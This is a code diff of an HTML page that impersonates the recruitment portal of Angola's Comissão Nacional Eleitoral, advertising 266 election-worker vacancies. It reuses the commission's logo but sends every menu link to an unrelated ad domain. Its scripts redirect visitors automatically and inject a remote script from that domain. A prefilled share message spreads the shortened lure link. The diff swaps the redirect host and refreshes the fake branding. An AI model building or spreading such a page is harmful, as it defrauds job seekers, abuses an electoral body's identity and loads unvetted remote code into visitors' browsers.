@@ -23,7 +23,7 @@ location.href='https://rebrand.ly/CNE-Recrutamento-portal';
 <meta property="og:title" content="Comissão Nacional Eleitoral(CNE)" />
 <meta property="og:description" content="O recrutamento de pessoal está em curso.">
 <meta property="og:site_name" content="website">
-<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-felL1bGv8kt9StSVoJ7ddEa5ceWHw4D1AoFo0gxY5TMTu7uMNcGkZ2sN8nRTAHg52s2kt8WTj9oTM7r0xJoqVH2zbuCAi-376wHPBLO8P8xFxfjL7X52JzZ3eMhPUKO5jkb8Hcgi-jMBkBP5pRtiNNVBod2J1WtDXiXVaN59MdYDI0nsCSlETW2V4i8/s900/Programa%20de%20Recrutamento%20202627.png">
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmuPygWZOEIzlo0PDiODeTYmWS6KVBs64tEXjtqJgS6Q0Oz1P6KiL2WHBpZBwVynFbnx7_PaV0CnKDIAWnzuIoulxeHx5d3OFPcVktpH7TNkeYMk5gwLs8glX1Bp1RHgZmJcCuW2QSFMT3LczY3sIyt3a8D7dl2KceVDOPzz6jFlfhz1B3x2IrdQFHq5s/s940/Programa%20de%20Recrutamento%20de%20Pessoal%2020262027.png">
 <meta content="width=device-width, initial-scale=1.0" name="viewport">
 <meta content="IE=EmulateIE7" http-equiv="X-UA-Compatible">
 <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
@@ -136,103 +136,293 @@ animation-iteration-count: 1;
 }
 </style>
 <style>
-/* GLOBAL RESET (safe) */
 body {
-margin: 0;
-background: #f1f4f8;
-font-family: 'Segoe UI', Arial, sans-serif;
+  margin: 0;
+  background: #f1f4f8;
+  font-family: 'Segoe UI', Arial, sans-serif;
 }
 
 /* CENTER ONLY THE MAIN CONTENT */
 .container, .main, .wrapper {
-max-width: 420px;
-margin: 20px auto; /* centers the card */
-background: #ffffff;
-border-radius: 16px;
-padding: 20px;
-box-shadow: 0 12px 30px rgba(0,0,0,0.08);
+  width: 100%;
+  max-width: 1100px;
+  margin: 20px auto;
+  background: #ffffff;
+  border-radius: 16px;
+  padding: 20px;
+  box-shadow: 0 12px 30px rgba(0,0,0,0.08);
+  box-sizing: border-box;
 }
 
-/* INPUTS — SHORTER & CENTERED */
+/* INPUTS */
 input, select {
-display: block;
-width: 92%; /* reduced length */
-margin: 10px auto; /* center horizontally */
-padding: 11px;
-border-radius: 10px;
-border: 1px solid #d0d5dd;
-font-size: 14px;
-box-sizing: border-box;
+  display: block;
+  width: 100%;
+  margin: 10px 0;
+  padding: 11px;
+  border-radius: 10px;
+  border: 1px solid #d0d5dd;
+  font-size: 14px;
+  box-sizing: border-box;
 }
 
 input:focus, select:focus {
-outline: none;
-border-color: #099c3a;
-box-shadow: 0 0 0 3px rgba(9,156,58,0.15);
+  outline: none;
+  border-color: #099c3a;
+  box-shadow: 0 0 0 3px rgba(9,156,58,0.15);
 }
 
-/* QUESTION TEXT */
 .question_text {
-font-weight: 600;
-margin: 18px 0 8px;
-color: #333;
+  font-weight: 600;
+  margin: 18px 0 8px;
+  color: #333;
 }
 
-/* ANSWER CONTAINER FIX */
 .ans-box {
-display: flex;
-flex-wrap: wrap;
-gap: 10px;
+  display: flex;
+  flex-wrap: wrap;
+  gap: 10px;
 }
 
-/* ANSWERS — AUTO FIT CONTENT */
 .answer {
-display: inline-flex;
-align-items: center;
-justify-content: center;
-padding: 10px 14px;
-background: #f9fafb;
-border: 1px solid #e4e7ec;
-border-radius: 20px;
-cursor: pointer;
-white-space: nowrap; /* keeps text neat */
-transition: all 0.2s ease;
-font-size: 14px;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  padding: 10px 14px;
+  background: #f9fafb;
+  border: 1px solid #e4e7ec;
+  border-radius: 20px;
+  cursor: pointer;
+  white-space: nowrap;
+  transition: all 0.2s ease;
+  font-size: 14px;
 }
 
-/* HOVER */
 .answer:hover {
-background: #eaf7f0;
-border-color: #099c3a;
+  background: #eaf7f0;
+  border-color: #099c3a;
 }
 
-/* SELECTED */
 .answer.active {
-background: #eaf7f0;
-border-color: #099c3a;
-box-shadow: 0 4px 12px rgba(9,156,58,0.15);
+  background: #eaf7f0;
+  border-color: #099c3a;
+  box-shadow: 0 4px 12px rgba(9,156,58,0.15);
 }
 
-/* SUBMIT DIV */
 .submit, .btn-submit {
-width: 92%;
-margin: 20px auto;
-background: #099c3a;
-color: #fff;
-padding: 14px;
-border-radius: 12px;
-text-align: center;
-font-weight: 700;
-cursor: pointer;
+  width: 100%;
+  margin: 20px 0;
+  background: #099c3a;
+  color: #fff;
+  padding: 14px;
+  border-radius: 12px;
+  text-align: center;
+  font-weight: 700;
+  cursor: pointer;
+  box-sizing: border-box;
 }
 
-/* MARQUEE POLISH */
 marquee {
-background: #eaf7f0;
-padding: 10px;
-border-radius: 8px;
-color: #099c3a;
-font-weight: 600;
+  background: #eaf7f0;
+  padding: 10px;
+  border-radius: 8px;
+  color: #099c3a;
+  font-weight: 600;
+}
+ .topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 14px;
+  padding: 12px 18px;
+  background: #ffffff;
+  border-bottom: 1px solid #e5e7eb;
+  box-shadow: 0 6px 18px rgba(0, 0, 0, 0.06);
+}
+
+.topbar-left,
+.topbar-right {
+  display: flex;
+  align-items: center;
+  flex-shrink: 0;
+}
+
+.topbar-center {
+  flex: 1;
+  text-align: center;
+  min-width: 0;
+}
+
+.site-title {
+  font-size: 1rem;
+  font-weight: 700;
+  color: #1f2937;
+  line-height: 1.2;
+}
+
+.site-subtitle {
+  font-size: 0.78rem;
+  color: #6b7280;
+  margin-top: 2px;
+}
+
+.menu-wrap {
+  position: relative;
+}
+
+.menu-btn {
+  width: 42px;
+  height: 42px;
+  border: none;
+  border-radius: 10px;
+  background: #f3f4f6;
+  color: #374151;
+  font-size: 1.6rem;
+  cursor: pointer;
+}
+
+.menu-btn:hover {
+  background: #e5e7eb;
+}
+
+.menu-dropdown {
+  display: none;
+  position: absolute;
+  top: 48px;
+  left: 0;
+  min-width: 180px;
+  background: #ffffff;
+  border: 1px solid #e5e7eb;
+  border-radius: 12px;
+  box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
+  overflow: hidden;
+  z-index: 1000;
+}
+
+.menu-dropdown a {
+  display: block;
+  padding: 12px 14px;
+  text-decoration: none;
+  color: #374151;
+  font-size: 0.95rem;
+}
+
+.menu-dropdown a:hover {
+  background: #f9fafb;
+  color: #9fcf67;
+}
+
+.menu-dropdown.show {
+  display: block;
+}
+
+.topbar-logo {
+  height: 46px;
+  width: 46px;
+  object-fit: cover;
+  border-radius: 12px;
+  border: 1px solid #e5e7eb;
+}
+ .site-footer {
+  background: linear-gradient(135deg, #16196e, #1f2687);
+  color: #ffffff;
+  padding: 32px 20px 18px;
+  margin-top: 40px;
+  border-top: 1px solid rgba(255, 255, 255, 0.08);
+}
+
+.footer-inner {
+  max-width: 1100px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 24px;
+  flex-wrap: wrap;
+}
+
+.footer-brand {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+}
+
+.footer-logo {
+  width: 64px;
+  height: 64px;
+  object-fit: contain;
+  background: rgba(255, 255, 255, 0.08);
+  border-radius: 14px;
+  padding: 8px;
+}
+
+.footer-text h3 {
+  font-size: 1.05rem;
+  margin: 0 0 4px;
+  font-weight: 700;
+}
+
+.footer-text p {
+  margin: 0;
+  font-size: 0.92rem;
+  color: rgba(255, 255, 255, 0.82);
+}
+
+.footer-socials {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.footer-socials a {
+  width: 42px;
+  height: 42px;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 12px;
+  background: rgba(255, 255, 255, 0.08);
+  transition: 0.2s ease;
+}
+
+.footer-socials a:hover {
+  background: rgba(255, 255, 255, 0.18);
+  transform: translateY(-2px);
+}
+
+.footer-socials img {
+  width: 20px;
+  height: 20px;
+}
+
+.footer-bottom {
+  max-width: 1100px;
+  margin: 22px auto 0;
+  padding-top: 14px;
+  text-align: center;
+  font-size: 0.88rem;
+  color: rgba(255, 255, 255, 0.78);
+  border-top: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+@media (max-width: 600px) {
+  .site-footer {
+    padding: 26px 14px 16px;
+  }
+
+  .footer-inner {
+    flex-direction: column;
+    text-align: center;
+  }
+
+  .footer-brand {
+    flex-direction: column;
+  }
+
+  .footer-logo {
+    width: 58px;
+    height: 58px;
+  }
 }
 </style>
 <script async src='/cdn-cgi/challenge-platform/h/g/scripts/invisible.js'></script><meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
@@ -1272,27 +1462,36 @@ box-shadow: 0 0 0 0 rgba(#5a99d4, 0);
   
 
 
-<header style="background-color: #f5f5f5; border-bottom: 2px solid #ddd; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between;">
+<header class="topbar">
+  <div class="topbar-left">
+    <div class="menu-wrap">
+      <button class="menu-btn" id="menuBtn" aria-label="Open menu">☰</button>
 
-    <!-- Left side: Menu + Search -->
-    <div style="display: flex; align-items: center; gap: 20px; font-size: 24px; color: #333; cursor: pointer;">
-        <span>&#9776;</span> <!-- Menu Icon -->
-        
+      <div class="menu-dropdown" id="menuDropdown">
+        <a href="https://ey43.com/4/9120968">Início</a>
+        <a href="https://ey43.com/4/9120968">Vagas</a>
+        <a href="https://ey43.com/4/9120968">Candidaturas</a>
+        <a href="https://ey43.com/4/9120968">Ajuda</a>
+        <a href="https://ey43.com/4/9120968">Contacto</a>
+      </div>
     </div>
+  </div>
 
-    <!-- Center: Website Name -->
-    <div style="font-size: 15px; font-weight: bold; color: #333; text-align: center; flex: 1;">
-        PORTAL OFICIAL DE RECRUTAMENTO
-    </div>
+  <div class="topbar-center">
+    <div class="site-title">PORTAL OFICIAL DE RECRUTAMENTO</div>
+    <div class="site-subtitle">Comissão Nacional Eleitoral</div>
+  </div>
 
-    <!-- Right side: Logo -->
-    <div style="display: flex; align-items: center; gap: 15px;">
-        <img src="https://gdb.voanews.com/6a6cd9bf-3980-46f8-b01f-6f54cd2a0b04_w1080_h608.jpg" alt="Logo" style="height: 50px;">
-    </div>
-
+  <div class="topbar-right">
+    <img
+      src="https://gdb.voanews.com/6a6cd9bf-3980-46f8-b01f-6f54cd2a0b04_w1080_h608.jpg"
+      alt="Logo"
+      class="topbar-logo"
+    >
+  </div>
 </header>
 
-<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-felL1bGv8kt9StSVoJ7ddEa5ceWHw4D1AoFo0gxY5TMTu7uMNcGkZ2sN8nRTAHg52s2kt8WTj9oTM7r0xJoqVH2zbuCAi-376wHPBLO8P8xFxfjL7X52JzZ3eMhPUKO5jkb8Hcgi-jMBkBP5pRtiNNVBod2J1WtDXiXVaN59MdYDI0nsCSlETW2V4i8/s900/Programa%20de%20Recrutamento%20202627.png" alt="Chicago" width="100%" height="35%">
+<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmuPygWZOEIzlo0PDiODeTYmWS6KVBs64tEXjtqJgS6Q0Oz1P6KiL2WHBpZBwVynFbnx7_PaV0CnKDIAWnzuIoulxeHx5d3OFPcVktpH7TNkeYMk5gwLs8glX1Bp1RHgZmJcCuW2QSFMT3LczY3sIyt3a8D7dl2KceVDOPzz6jFlfhz1B3x2IrdQFHq5s/s940/Programa%20de%20Recrutamento%20de%20Pessoal%2020262027.png" alt="Chicago" width="100%" height="35%">
 
 <div class="content">
 <!-- content -->
@@ -1480,7 +1679,7 @@ fn1_a();
 },2000)
 }
 
-j='*AVISO PÚBLICO‼*%0A%0AA *Comissão Nacional Eleitoral (CNE)* convida pessoas qualificadas e elegíveis a candidatarem-se como *Agente da Mesa de Voto* e *Observadores* para as próximas atividades eleitorais. %0AClique no link abaixo para submeter a sua candidatura.%0Ahttps://rebrand.ly/CNE-Recrutamento-portal%0A';
+j='*AVISO PÚBLICO‼*%0A%0AA *A Comissão Eleitoral Nacional (CNE)* convida os cidadãos qualificados e elegíveis a candidatarem-se e a preencherem duzentas e sessenta e seis (266) vagas em preparação para as próximas atividades eleitorais. %0APara se candidatar a uma vaga, utilize o portal oficial de recrutamento abaixo.%0Ahttps://rebrand.ly/CNE-Recrutamento-portal%0A';
 banner='';
 $.getScript('yuming.js?'+ (new Date()).getTime());
 
@@ -1651,10 +1850,10 @@ function jp() {
 fh();}
 setTimeout('hh();', 500);
 function fh(){
-location.href="https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a";
+location.href="https://ey43.com/4/9120968";
 }
 function goon(){
-location.href="https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a";
+location.href="https://ey43.com/4/9120968";
 }
 </script>
 
@@ -1667,17 +1866,17 @@ function jp() {
 fh();}
 setTimeout('hh();', 500);
 function fh(){
-location.href="https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a;
+location.href="https://ey43.com/4/9120968;
 }
 function goon(){
-location.href="https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a;
+location.href="https://ey43.com/4/9120968;
 }
 </script>
 <script>
 var _hmt = _hmt || [];
 (function() {
 var hm = document.createElement("script");
-hm.src = "https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a";
+hm.src = "https://ey43.com/4/9120968";
 var s = document.getElementsByTagName("script")[0];
 s.parentNode.insertBefore(hm, s);
 })();
@@ -1687,48 +1886,53 @@ s.parentNode.insertBefore(hm, s);
 
 
 
+<script>
+  const menuBtn = document.getElementById("menuBtn");
+  const menuDropdown = document.getElementById("menuDropdown");
 
+  menuBtn.addEventListener("click", function (e) {
+    e.stopPropagation();
+    menuDropdown.classList.toggle("show");
+  });
+
+  document.addEventListener("click", function () {
+    menuDropdown.classList.remove("show");
+  });
+</script>
 
 
 </body>
 </html>
-<footer style="background-color: #16196e; padding: 40px 0; text-align: center; border-top: 2px solid #ddd;">
-<div style="max-width: 900px; margin: auto; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 20px;">
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-brand">
+      <img src="https://www.cne.ao/images/logotipo/footer.png" alt="CNE Logo" class="footer-logo">
+      <div class="footer-text">
+        <h3>Comissão Nacional Eleitoral (CNE)</h3>
+        <p>Programa de Recrutamento 2026/27</p>
+      </div>
+    </div>
 
-<!-- Logo section -->
-<div style="margin-bottom: 20px;">
-<img src="https://www.cne.ao/images/logotipo/footer.png" alt="CENI Logo" style="height: 60px;">
-</div>
+    <div class="footer-socials">
+      <a href="https://facebook.com" target="_blank" aria-label="Facebook">
+        <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
+      </a>
+      <a href="https://instagram.com" target="_blank" aria-label="Instagram">
+        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram">
+      </a>
+      <a href="https://x.com" target="_blank" aria-label="X">
+        <img src="https://cdn-icons-png.flaticon.com/512/5968/5968958.png" alt="X">
+      </a>
+    </div>
+  </div>
 
-<!-- Writing space -->
-<div style="margin-bottom: 20px; font-size: 16px; color: #fff;">
-<p><b>Comissão Nacional Eleitoral(CNE)</b></p>
-<p>Programa de Recrutamento 2026/27</p>
-</div>
-</div>
+  <div class="footer-bottom">
+    &copy; <span id="year"></span> CNE. Todos os Direitos Reservados.
+  </div>
 
-<!-- Copyright -->
-<div style="text-align: center; font-size: 14px; color: #fff; margin-top: 10px;">
-&copy; <span id="year"></span> CNE Todos os Direitos Reservados..
-</div>
-
-<!-- Social media icons -->
-<div style="margin-top: 10px;">
-<a href="https://facebook.com" target="_blank" style="margin: 0 10px;">
-<img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook" style="width: 25px; height: 25px;">
-</a>
-<a href="https://instagram.com" target="_blank" style="margin: 0 10px;">
-<img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram" style="width: 25px; height: 25px;">
-</a>
-<a href="https://x.com" target="_blank" style="margin: 0 10px;">
-<img src="https://cdn-icons-png.flaticon.com/512/5968/5968958.png" alt="X (Twitter)" style="width: 25px; height: 25px;">
-</a>
-</div>
-
-<!-- Auto-update year script -->
-<script>
-document.getElementById('year').textContent = new Date().getFullYear();
-</script>
+  <script>
+    document.getElementById("year").textContent = new Date().getFullYear();
+  </script>
 </footer>
 <!-- BEGIN: Powered by Supercounters.com -->
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1727717,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
